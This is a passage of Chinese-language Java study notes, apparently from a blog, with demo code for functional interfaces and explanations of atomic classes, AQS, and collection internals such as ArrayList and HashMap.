class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Function&lt;String， String&gt; function = new Function&lt;String， String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public String apply(String s) &#123;</span></span><br><span class="line"><span class="comment">//                System.out.println(s);</span></span><br><span class="line"><span class="comment">//                return s;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        function.apply(&quot;100&quot;);</span></span><br><span class="line">        <span class="type">Function</span> <span class="variable">function</span> <span class="operator">=</span> (str) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;;</span><br><span class="line">        System.out.println(function.apply(<span class="string">&quot;asd&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Predicate;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 断定型接口： 有一个输入参数， 返回值为boolean</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:25 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Predicate&lt;String&gt; predicate = new Predicate&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public boolean test(String s) &#123;</span></span><br><span class="line"><span class="comment">//                return !&quot;&quot;.equals(s);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        String s = &quot;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(predicate.test(s));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        Predicate&lt;String&gt; predicate = (s)-&gt; !&quot;&quot;.equals(s);</span></span><br><span class="line"><span class="comment">//        String s = &quot;&quot;;</span></span><br><span class="line"><span class="comment">//        System.out.println(predicate.test(s));</span></span><br><span class="line"></span><br><span class="line">        Predicate&lt;String&gt; predicate = String::isEmpty;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;11&quot;</span>;</span><br><span class="line">        System.out.println(predicate.test(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Consumer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Consumer 消费型接口：只有输入，没有返回值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:32 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo03</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Consumer&lt;String&gt; consumer = new Consumer&lt;String&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void accept(String s) &#123;</span></span><br><span class="line"><span class="comment">//                System.out.println(s);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        consumer.accept(&quot;sss&quot;);</span></span><br><span class="line"></span><br><span class="line">        Consumer&lt;String&gt; consumer = System.out::println;</span><br><span class="line">        consumer.accept(<span class="string">&quot;ss&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> function;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.function.Supplier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * supplier 供给型接口， 没有参数只有返回值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 9:33 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo04</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        Supplier&lt;Integer&gt; supplier = new Supplier&lt;Integer&gt;() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public Integer get() &#123;</span></span><br><span class="line"><span class="comment">//                return 1024;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//        System.out.println(supplier.get());</span></span><br><span class="line"></span><br><span class="line">        Supplier&lt;Integer&gt; supplier = ()-&gt;<span class="number">1024</span>;</span><br><span class="line">        System.out.println(supplier.get());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Stream流式计算"><a href="#Stream流式计算" class="headerlink" title="Stream流式计算"></a>Stream流式计算</h2><p>集合、MySQL本质就是存储东西的；计算都应该交给流来操作；</p>
<h2 id="ForkJoin"><a href="#ForkJoin" class="headerlink" title="ForkJoin"></a>ForkJoin</h2><p>Jdk1.7，并发执行任务，提高效率； 大数据量；  工作窃取；  B线程执行完会去拿A的线程没执行完的任务； 线程里面的任务是双端队列，两端都可以取到任务； </p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848164.png" alt="image-20210427072722808" style="zoom:50%;" />

<p>大数据： Map Reduce（把大任务拆分成小任务）；</p>
<p>fork()：开启一个新线程（或是重用线程池内的空闲线程），将任务交给该线程处理。<br>join()：等待该任务的处理线程处理完毕，获得返回值。</p>
<h2 id="异步回调"><a href="#异步回调" class="headerlink" title="异步回调"></a>异步回调</h2><p>completableFuture可以有返回值也可以没有，也是新建线程去处理。</p>
<h2 id="Atomic原子类"><a href="#Atomic原子类" class="headerlink" title="Atomic原子类"></a>Atomic原子类</h2><ul>
<li>具有原子&#x2F;原子操作特征的类；</li>
<li>使用 AtomicInteger 之后，不用对 increment() 方法加锁也可以保证线程安全；</li>
<li>底层CAS实现；</li>
<li>在内存中修改值， Unsafe类，里面基本都是调用native方法。</li>
</ul>
<p>AtomicInteger 类主要利用 CAS (compare and swap) + volatile 和 native 方法来保证原子操作，从而避免 synchronized 的高开销，执行效率大为提升。</p>
<h3 id="JUC-包中的原子类是哪-4-类"><a href="#JUC-包中的原子类是哪-4-类" class="headerlink" title="JUC 包中的原子类是哪 4 类?"></a>JUC 包中的原子类是哪 4 类?</h3><p><strong>基本类型</strong></p>
<p>使用原子的方式更新基本类型</p>
<ul>
<li><code>AtomicInteger</code>：整形原子类</li>
<li><code>AtomicLong</code>：长整型原子类</li>
<li><code>AtomicBoolean</code>：布尔型原子类</li>
</ul>
<p><strong>数组类型</strong></p>
<p>使用原子的方式更新数组里的某个元素</p>
<ul>
<li><code>AtomicIntegerArray</code>：整形数组原子类</li>
<li><code>AtomicLongArray</code>：长整形数组原子类</li>
<li><code>AtomicReferenceArray</code>：引用类型数组原子类</li>
</ul>
<p><strong>引用类型</strong></p>
<ul>
<li><code>AtomicReference</code>：引用类型原子类</li>
<li><code>AtomicStampedReference</code>：原子更新带有版本号的引用类型。该类将整数值与引用关联起来，可用于解决原子的更新数据和数据的版本号，可以解决使用 CAS 进行原子更新时可能出现的 ABA 问题。</li>
<li><code>AtomicMarkableReference</code> ：原子更新带有标记位的引用类型</li>
</ul>
<p><strong>对象的属性修改类型</strong></p>
<ul>
<li><code>AtomicIntegerFieldUpdater</code>：原子更新整形字段的更新器</li>
<li><code>AtomicLongFieldUpdater</code>：原子更新长整形字段的更新器</li>
<li><code>AtomicReferenceFieldUpdater</code>：原子更新引用类型字段的更新器</li>
</ul>
<h3 id="AtomicInteger的使用"><a href="#AtomicInteger的使用" class="headerlink" title="AtomicInteger的使用"></a>AtomicInteger的使用</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">()</span> <span class="comment">//获取当前的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndSet</span><span class="params">(<span class="type">int</span> newValue)</span><span class="comment">//获取当前的值，并设置新的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndIncrement</span><span class="params">()</span><span class="comment">//获取当前的值，并自增</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndDecrement</span><span class="params">()</span> <span class="comment">//获取当前的值，并自减</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">getAndAdd</span><span class="params">(<span class="type">int</span> delta)</span> <span class="comment">//获取当前的值，并加上预期的值</span></span><br><span class="line"><span class="type">boolean</span> <span class="title function_">compareAndSet</span><span class="params">(<span class="type">int</span> expect， <span class="type">int</span> update)</span> <span class="comment">//如果输入的数值等于预期值，则以原子方式将该值设置为输入值（update）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">lazySet</span><span class="params">(<span class="type">int</span> newValue)</span><span class="comment">//最终设置为newValue，使用 lazySet 设置之后可能导致其他线程在之后的一小段时间内还是可以读到旧的值。</span></span><br></pre></td></tr></table></figure>

<h3 id="AtomicInteger类的原理"><a href="#AtomicInteger类的原理" class="headerlink" title="AtomicInteger类的原理"></a>AtomicInteger类的原理</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// setup to use Unsafe.compareAndSwapInt for updates（更新操作时提供“比较并替换”的作用）</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> Unsafe.getUnsafe();</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> valueOffset;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        valueOffset = unsafe.objectFieldOffset</span><br><span class="line">            (AtomicInteger.class.getDeclaredField(<span class="string">&quot;value&quot;</span>));</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception ex) &#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(ex); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> value;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>AtomicInteger 类主要利用 CAS （compare and swap）+ volatile 和 native 方法来保证原子操作，从而避免 synchronized 的高开销，执行效率大为提升。</p>
<p>CAS 的原理是拿期望的值和原本的一个值作比较，如果相同则更新成新的值。UnSafe 类的 objectFieldOffset() 方法是一个本地方法，这个方法是用来拿到“原来的值”的内存地址，返回值是 valueOffset。另外 value 是一个 volatile 变量，在内存中可见，因此 JVM 可以保证任何时刻任何线程总能拿到该变量的最新值。</p>
<h2 id="AQS"><a href="#AQS" class="headerlink" title="AQS"></a>AQS</h2><p>AQS 的全称为（AbstractQueuedSynchronizer），这个类在java.util.concurrent.locks包下面;</p>
<p>AQS 是一个用来构建锁和同步器的框架，使用 AQS 能简单且高效地构造出应用广泛的大量的同步器，比如 ReentrantLock，Semaphore，其他的诸如 ReentrantReadWriteLock，SynchronousQueue，FutureTask 等等皆是基于 AQS 的。</p>
<h3 id="AQS原理分析"><a href="#AQS原理分析" class="headerlink" title="AQS原理分析"></a>AQS原理分析</h3><p>AQS 核心思想是，如果被请求的共享资源空闲，则将当前请求资源的线程设置为有效的工作线程，并且将共享资源设置为锁定状态。如果被请求的共享资源被占用，那么就需要一套线程阻塞等待以及被唤醒时锁分配的机制，这个机制 AQS 是用 CLH 队列锁实现的，即将暂时获取不到锁的线程加入到队列中。</p>
<p>CLH（Craig、Landin、and Hagersten）队列是一个虚拟的双向队列（虚拟的双向队列即不存在队列实例，仅存在结点之间的关联关系）。AQS 是将每条请求共享资源的线程封装成一个 CLH 锁队列的一个结点（Node）来实现锁的分配。</p>
<p>AQS 使用一个 int 成员变量来表示同步状态，通过内置的 FIFO 队列来完成获取资源线程的排队工作。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848262.png" alt="AQS原理图"></p>
<h3 id="AQS对资源的共享方式"><a href="#AQS对资源的共享方式" class="headerlink" title="AQS对资源的共享方式"></a>AQS对资源的共享方式</h3><p><strong>AQS 定义两种资源共享方式</strong></p>
<ul>
<li>Exclusive（独占）：只有一个线程能执行，如ReentrantLock<ul>
<li>公平锁：按照线程在队列中的排队顺序，先到者先拿到锁</li>
<li>非公平锁：当线程要获取锁时，无视队列顺序直接去抢锁，谁抢到就是谁的</li>
</ul>
</li>
<li>Share（共享）：多个线程可同时执行，如CountDownLatch、Semaphore、 CyclicBarrier、ReadWriteLock 。</li>
</ul>
<p>ReentrantReadWriteLock 可以看成是组合式，因为 ReentrantReadWriteLock 也就是读写锁允许多个线程同时对某一资源进行读。</p>
<p>不同的自定义同步器争用共享资源的方式也不同。自定义同步器在实现时只需要实现共享资源 state 的获取与释放方式即可，至于具体线程等待队列的维护（如获取资源失败入队&#x2F;唤醒出队等），AQS 已经在顶层实现好了。</p>
<h4 id="AQS底层使用模版方法模式"><a href="#AQS底层使用模版方法模式" class="headerlink" title="AQS底层使用模版方法模式"></a>AQS底层使用模版方法模式</h4><p>同步器的设计是基于模板方法模式的，如果需要自定义同步器一般的方式是这样（模板方法模式很经典的一个应用）：</p>
<ol>
<li>使用者继承 AbstractQueuedSynchronizer 并重写指定的方法。（这些重写方法很简单，无非是对于共享资源 state 的获取和释放）</li>
<li>将 AQS 组合在自定义同步组件的实现中，并调用其模板方法，而这些模板方法会调用使用者重写的方法。</li>
</ol>
<p>这和我们以往通过实现接口的方式有很大区别，这是模板方法模式很经典的一个运用。</p>
<p>AQS 使用了模板方法模式，自定义同步器时需要重写下面几个 AQS 提供的模板方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">isHeldExclusively()<span class="comment">//该线程是否正在独占资源。只有用到condition才需要去实现它。</span></span><br><span class="line">tryAcquire(<span class="type">int</span>)<span class="comment">//独占方式。尝试获取资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryRelease(<span class="type">int</span>)<span class="comment">//独占方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br><span class="line">tryAcquireShared(<span class="type">int</span>)<span class="comment">//共享方式。尝试获取资源。负数表示失败；0表示成功，但没有剩余可用资源；正数表示成功，且有剩余资源。</span></span><br><span class="line">tryReleaseShared(<span class="type">int</span>)<span class="comment">//共享方式。尝试释放资源，成功则返回true，失败则返回false。</span></span><br></pre></td></tr></table></figure>

<p>默认情况下，每个方法都抛出 UnsupportedOperationException。 这些方法的实现必须是内部线程安全的，并且通常应该简短而不是阻塞。AQS 类中的其他方法都是 final ，所以无法被其他类使用，只有这几个方法可以被其他类使用。</p>
<p>以 ReentrantLock 为例，state 初始化为 0，表示未锁定状态。A 线程 lock()时，会调用 tryAcquire()独占该锁并将 state+1。此后，其他线程再 tryAcquire()时就会失败，直到 A 线程 unlock()到 state&#x3D;0（即释放锁）为止，其它线程才有机会获取该锁。当然，释放锁之前，A 线程自己是可以重复获取此锁的（state 会累加），这就是可重入的概念。但要注意，获取多少次就要释放多么次，这样才能保证 state 是能回到零态的。</p>
<p>再以 CountDownLatch 以例，任务分为 N 个子线程去执行，state 也初始化为 N（注意 N 要与线程个数一致）。这 N 个子线程是并行执行的，每个子线程执行完后countDown() 一次，state 会 CAS（Compare and Swap）减 1。等到所有子线程都执行完后（即 state&#x3D;0），会 unpark()主调用线程，然后主调用线程就会从 await() 函数返回，继续后余动作。</p>
<p>一般来说，自定义同步器要么是独占方法，要么是共享方式，他们也只需实现tryAcquire-tryRelease、tryAcquireShared-tryReleaseShared中的一种即可。但 AQS 也支持自定义同步器同时实现独占和共享两种方式，如ReentrantReadWriteLock。</p>
<p>推荐两篇 AQS 原理和相关源码分析的文章：</p>
<ul>
<li><a href="http://www.cnblogs.com/waterystone/p/4920797.html">http://www.cnblogs.com/waterystone/p/4920797.html</a></li>
<li><a href="https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html">https://www.cnblogs.com/chengxiao/archive/2017/07/24/7141160.html</a></li>
</ul>
<h3 id="AQS组件总结"><a href="#AQS组件总结" class="headerlink" title="AQS组件总结"></a>AQS组件总结</h3><ul>
<li>Semaphore（信号量）-允许多个线程同时访问： synchronized 和 ReentrantLock 都是一次只允许一个线程访问某个资源，Semaphore(信号量)可以指定多个线程同时访问某个资源。</li>
<li>CountDownLatch（倒计时器）： CountDownLatch 是一个同步工具类，用来协调多个线程之间的同步。这个工具通常用来控制线程等待，它可以让某一个线程等待直到倒计时结束，再开始执行。</li>
<li>CyclicBarrier（循环栅栏）： CyclicBarrier 和 CountDownLatch 非常类似，它也可以实现线程间的技术等待，但是它的功能比 CountDownLatch 更加复杂和强大。主要应用场景和 CountDownLatch 类似。CyclicBarrier 的字面意思是可循环使用（Cyclic）的屏障（Barrier）。它要做的事情是，让一组线程到达一个屏障（也可以叫同步点）时被阻塞，直到最后一个线程到达屏障时，屏障才会开门，所有被屏障拦截的线程才会继续干活。CyclicBarrier 默认的构造方法是 CyclicBarrier(int parties)，其参数表示屏障拦截的线程数量，每个线程调用 await() 方法告诉 CyclicBarrier 我已经到达了屏障，然后当前线程被阻塞。</li>
</ul>
<h3 id="CountDownLatch-1"><a href="#CountDownLatch-1" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h3><p>CountDownLatch 的作用就是允许 count 个线程阻塞在一个地方，直至所有线程的任务都执行完毕。</p>
<p>例如：</p>
<p>要读取处理 6 个文件，这 6 个任务都是没有执行顺序依赖的任务，但是需要返回给用户的时候将这几个文件的处理的结果进行统计整理。</p>
<p>为此定义了一个线程池和 count 为 6 的CountDownLatch对象 。使用线程池处理读取任务，每一个线程处理完之后就将 count-1，调用CountDownLatch对象的 await()方法，直到所有文件读取完之后，才会接着执行后面的逻辑。</p>
<h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848279.png" alt="img"></p>
<h2 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h2><ul>
<li><p>初始大小10；</p>
</li>
<li><p>扩容1.5倍左右，15、 33 、 49；</p>
</li>
<li><p>线程不安全，适用于频繁的查找工作；</p>
</li>
<li><p>list尾部会预留一些空间；</p>
</li>
<li><p>插入和删除元素需要复制，浪费性能。 </p>
</li>
<li><p>实现了RandomAccess接口（在 binarySearch方法中），它要判断传入的 list 是否是RamdomAccess 的实例，如果是，调用indexedBinarySearch()方法，如果不是，那么调用iteratorBinarySearch()方法；</p>
</li>
<li><p>实现了cloneable和serializable接口；</p>
</li>
<li><p>JDK7 new无参构造的ArrayList对象时，直接创建了长度是10的Object[]数组elementData 。jdk7中的ArrayList的对象的创建类似于单例的饿汉式，而jdk8中的ArrayList的对象的创建类似于单例的懒汉式。</p>
</li>
</ul>
<h3 id="为什么-ArrayList-的-elementData-加上-transient-修饰？"><a href="#为什么-ArrayList-的-elementData-加上-transient-修饰？" class="headerlink" title="为什么 ArrayList 的 elementData 加上 transient 修饰？"></a>为什么 ArrayList 的 elementData 加上 transient 修饰？</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> Object[] elementData;</span><br></pre></td></tr></table></figure>

<p>ArrayList 的定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ArrayList</span>&lt;E&gt; <span class="keyword">extends</span> <span class="title class_">AbstractList</span>&lt;E&gt; <span class="keyword">implements</span> <span class="title class_">List</span>&lt;E&gt;， RandomAccess， Cloneable， java.io.Serializable</span><br></pre></td></tr></table></figure>

<p>可以看到 ArrayList 实现了 Serializable 接口，这意味着 ArrayList 支持序列化。transient 的作用是说不希望 elementData 数组被序列化，重写了 writeObject 实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> java.io.IOE xception&#123; </span><br><span class="line">  <span class="comment">// Write out element count， and any hidden stuff </span></span><br><span class="line">  <span class="type">int</span> <span class="variable">expectedModCount</span> <span class="operator">=</span> modCount; </span><br><span class="line">  s.defaultWriteObject(); </span><br><span class="line">  <span class="comment">// Write out array length</span></span><br><span class="line">  s.writeInt(elementData.length); </span><br><span class="line">  <span class="comment">// Write out all elements in the proper order.* </span></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) </span><br><span class="line">  s.writeObject(elementData[i]); </span><br><span class="line">  <span class="keyword">if</span> (modCount != expectedModCount) &#123; </span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConcurrentModificationException</span>();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>每次序列化时，先调用 defaultWriteObject() 方法序列化 ArrayList 中的非transient 元素，然后遍历 elementData，只序列化已存入的元素，这样既加快了序列化的速度，又减小了序列化之后的文件大小。</p>
<h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><ul>
<li>JDK1.6是双向循环链表，JDK1.7为双向链表；</li>
<li>不保证线程安全；</li>
<li>存放前驱和后继的引用会浪费空间；</li>
<li>没有实现RandomAccess接口；</li>
<li>实现List接口和Deque接口；</li>
<li>Collections类中的synchronizedList方法。</li>
</ul>
<h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><ul>
<li>初始大小为10，扩容是2倍；</li>
<li>list的古老实现类；</li>
<li>Vector 的所有方法加上了 synchronized 关键字，线程安全。</li>
</ul>
<h2 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h2><ul>
<li>继承自vector；</li>
<li>线程安全。</li>
</ul>
<h2 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h2><ul>
<li>PriorityQueue是非线程安全的；</li>
<li>Java提供了PriorityBlockingQueue（实现BlockingQueue接口）用于Java多线程环境；</li>
<li>默认小顶堆实现，底层为数组。</li>
</ul>
<h2 id="ArrayDeque"><a href="#ArrayDeque" class="headerlink" title="ArrayDeque"></a>ArrayDeque</h2><ul>
<li>初始为16，扩容两倍；</li>
<li>双端队列，底层为循环数组；</li>
<li>不能添加null值；</li>
<li>add方法就是调用addLast方法；getLast、getFirst、addFirst、pollFirst、pollLast；</li>
<li>判断队满(tail &#x3D; (tail + 1) &amp; (elements.length - 1)) &#x3D;&#x3D; head。</li>
</ul>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848289.png" alt="img" style="zoom: 67%;" />

<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><ul>
<li>检索元素效率低下，删除和插入效率高，插入和删除不会引起元素位置改变。</li>
</ul>
<h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><ul>
<li>TreeSet 底层使用红黑树，能够按照添加元素的顺序进行遍历，排序的方式有自然排序和定制排序；</li>
<li>有序的，并且没有重复元素的集合；</li>
<li>非线程安全；</li>
<li>可序列化。</li>
</ul>
<h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><ul>
<li><p>HashMap 相对于 HashSet 较快，因为它是使用唯一的键获取对象；</p>
</li>
<li><p>HashSet 底层就是基于 HashMap 实现的。HashSet 的源码非常非常少，因为除了 clone()、writeObject()、readObject()是 HashSet 自己不得不实现之外，其他方法都是直接调用 HashMap 中的方法。</p>
</li>
<li><p>当把对象加入HashSet时，HashSet 会先计算对象的hashcode值来判断对象加入的位置，同时也会与其他加入的对象的 hashcode 值作比较，如果没有相符的 hashcode，HashSet 会假设对象没有重复出现。但是如果发现有相同 hashcode 值的对象，这时会调用equals()方法来检查 hashcode 相等的对象是否真的相同。如果两者相同，HashSet 就不会让加入操作成功。</p>
</li>
</ul>
<h2 id="LinkedHashSet"><a href="#LinkedHashSet" class="headerlink" title="LinkedHashSet"></a>LinkedHashSet</h2><ul>
<li>LinkedHashSet 是 HashSet 的子类，能够按照添加的顺序遍历；</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848337.png" alt="img"></p>
<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><ul>
<li>16 0.75 扩容为2倍；</li>
<li>尾插法 (jdk1.7用头插法)，桶大于64才会树化，当桶小于64则先扩容；</li>
<li>单链表；</li>
<li>允许一个key为null，value可以有多个null； </li>
<li>1.7 先判断是否需要扩容，再插入，1.8 先进行插入，插入完成再判断是否需要扩容； 1.7没有红黑树机制；</li>
</ul>
<h3 id="扩容机制-1-8"><a href="#扩容机制-1-8" class="headerlink" title="扩容机制(1.8)"></a>扩容机制(1.8)</h3><p>假设初始容量为16，hash(key1) &#x3D; 0001，然后计算0001 &amp; 1111&#x3D; 1， 尾插法放到1号位置，hash(key2) &#x3D; 10001，然后计算10001 &amp; 1111 &#x3D; 1，尾插法放到1号位置，此时扩容为32，先判断hash(key1) &amp; 16 &#x3D;&#x3D; 0? 等于0的都放到lohead这队，然后不等于0的都放到 hihead这一队，lohead放在新表的原来的位置， hihead这队放到新表的j + oldCap位置（原来的位置加上旧表的容量）；可以防止死循环问题；</p>
<h3 id="HashMap为什么不序列化table"><a href="#HashMap为什么不序列化table" class="headerlink" title="HashMap为什么不序列化table?"></a>HashMap为什么不序列化table?</h3><p>桶数组被transient修饰，HashMap 并没有使用默认的序列化机制，而是通过实现readObject&#x2F;writeObject两个方法自定义了序列化的内容。HashMap 中存储的内容是键值对。所以只要把键值对序列化了，就可以根据键值对数据重建 HashMap。直接序列化 talbe 存在着两个问题：</p>
<ol>
<li>table 多数情况下是无法被存满的，序列化未使用的部分，浪费空间；</li>
<li>同一个键值对在不同 JVM 下，所处的桶位置可能是不同的，在不同的 JVM 下反序列化 table 可能会发生错误。</li>
</ol>
<p>HashMap 的get&#x2F;put&#x2F;remove等方法第一步就是根据 hash找到键所在的桶位置，但如果键没有覆写 hashCode 方法，计算hash 时最终调用 Object 中的 hashCode 方法。但Object 中的hashCode方法是native 型的，不同的 JVM下，可能会有不同的实现，产生的 hash 可能也是不一样的。也就是说同一个键在不同平台下可能会产生不同的 hash，此时再对在同一个 table 继续操作，就会出现问题。</p>
<h3 id="hashmap的长度为什么是2的幂次方"><a href="#hashmap的长度为什么是2的幂次方" class="headerlink" title="hashmap的长度为什么是2的幂次方"></a>hashmap的长度为什么是2的幂次方</h3><p>为了能让 HashMap 存取高效，尽量较少碰撞，也就是要尽量把数据分配均匀。Hash（需要扰动）值的范围值-2147483648 到 2147483647，前后加起来大概 40 亿的映射空间，只要哈希函数映射得比较均匀松散，一般应用是很难出现碰撞的。但问题是一个 40 亿长度的数组，内存是放不下的。所以这个散列值是不能直接拿来用的。用之前还要先做对数组的长度取模运算，得到的余数才能用来要存放的位置也就是对应的数组下标。这个数组下标的计算方法是“ <code>(n - 1) &amp; hash</code>”。（n 代表数组长度）。这也就解释了 HashMap 的长度为什么是 2 的幂次方。</p>
<p>这个算法应该如何设计呢？</p>
<p>首先可能会想到采用%取余的操作来实现。但是，重点来了：“取余(%)操作中如果除数是 2 的幂次则等价于与其除数减一的与(&amp;)操作（也就是说 hash%length&#x3D;&#x3D;hash&amp;(length-1)的前提是 length 是 2 的 n 次方；）。” 并且采用二进制位操作 &amp;，相对于%能够提高运算效率，这就解释了 HashMap 的长度为什么是 2 的幂次方。</p>
<h3 id="HashMap多线程操作导致死循环问题"><a href="#HashMap多线程操作导致死循环问题" class="headerlink" title="HashMap多线程操作导致死循环问题"></a>HashMap多线程操作导致死循环问题</h3><p>主要原因在于并发下的 Rehash 会造成元素之间会形成一个循环链表。jdk 1.8 后解决了这个问题，但是还是不建议在多线程下使用 HashMap，因为多线程下使用 HashMap 还是会存在其他问题比如数据丢失。并发环境下推荐使用 ConcurrentHashMap 。</p>
